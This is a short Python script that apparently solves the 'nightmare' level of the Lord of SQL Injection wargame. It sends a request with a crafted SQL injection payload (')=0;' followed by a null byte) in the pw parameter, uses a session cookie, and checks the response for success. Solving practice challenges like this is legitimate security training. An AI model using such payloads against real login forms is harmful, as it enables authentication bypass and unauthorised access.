import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/nightmare_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

res = requests.get(url, params={'pw': '\')=0;\0'},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")